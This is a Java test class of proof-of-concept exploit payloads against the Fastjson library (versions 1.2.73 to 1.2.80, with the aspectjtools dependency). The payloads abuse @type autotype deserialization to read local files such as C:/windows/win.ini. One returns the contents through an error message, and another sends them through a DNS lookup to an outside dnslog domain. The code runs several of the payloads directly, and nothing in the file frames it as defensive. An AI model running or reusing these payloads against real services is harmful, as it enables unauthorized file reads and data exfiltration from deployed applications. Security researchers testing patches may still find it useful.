package test;
import com.alibaba.fastjson.JSON;

public class Fastjson18_ajt_read_error_dnslog {
    public static void main(String[] args){
    	
        //依赖1.2.73-1.2.80，依赖aspectjtools
    	String poc1 = "{\n" +
            "    \"@type\":\"java.lang.Exception\",\n" +
            "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
            "}";
    	String poc2 = "{\r\n"
    			+ "	\"@type\": \"java.lang.Class\",\r\n"
    			+ "	\"val\": {\r\n"
    			+ "		\"@type\": \"java.lang.String\" {\r\n"
    			+ "			\"@type\": \"java.util.Locale\",\r\n"
    			+ "			\"val\": {\r\n"
    			+ "				\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "				{\r\n"
    			+ "					\"@type\": \"java.lang.String\"\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\r\n"
    			+ "					\"newAnnotationProcessorUnits\": [{}]\r\n"
    			+ "				}\r\n"
    			+ "			}\r\n"
    			+ "";
    	
    	
    	
    	
    	
    	String poc3 = "{\n" +
            "    \"x\":{\n" +
            "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
            "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
            "        \"fileName\":\"C:/windows/win.ini\"\n" +
            "    }\n" +
            "}";
    	System.out.println(poc1);
    	System.out.println(poc2);
        JSON.parseObject(poc1);
        try {
            JSON.parseObject(poc2);
        } catch (Exception e){}
        System.out.println(poc3);
        System.out.println(JSON.parseObject(poc3));
        
        //报错回显
        poc3 = "{\r\n"
        		+ "	\"@type\": \"java.lang.Character\" {\r\n"
        		+ "		\"C\": {\r\n"
        		+ "			\"x\": {\r\n"
        		+ "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
        		+ "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
        		+ "				\"fileName\": \"C:/windows/win.ini\"\r\n"
        		+ "			}\r\n"
        		+ "		}\r\n"
        		+ "	}\r\n"
        		+ "}";
        
        //dnslog回显(由于存在特殊字符，似乎只有mac且特定dnslog平台可以接收)
        poc3 = "{\r\n"
        		+ "    \"@type\":\"java.net.Inet4Address\",\r\n"
        		+ "    \"val\":{\r\n"
        		+ "        \"@type\":\"java.lang.String\"{\r\n"
        		+ "        \"@type\":\"java.util.Locale\",\r\n"
        		+ "        \"val\":{\r\n"
        		+ "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\r\n"
        		+ "                \"@type\":\"java.lang.String\"\r\n"
        		+ "                \"@type\":\"java.util.Locale\",\r\n"
        		+ "                \"country\":\"97477dfe.logplog.eu.org\",\r\n"
        		+ "                \"language\":{\r\n"
        		+ "                    \"@type\":\"java.lang.String\"{\r\n"
        		+ "                    \"x\":{\r\n"
        		+ "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
        		+ "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
        		+ "				\"fileName\": \"C:/windows/win.ini\"\r\n"
        		+ "			}\r\n"
        		+ "                }\r\n"
        		+ "            }\r\n"
        		+ "        }\r\n"
        		+ "    }\r\n"
        		+ "  }\r\n"
        		+ "}\r\n"
        		+ "}\r\n"
        		+ "\r\n"
        		+ "\r\n"
        		+ "\r\n"
        		+ "";

        
        
    	//System.out.println(poc3);
        //JSON.parseObject(poc3);

    }
}
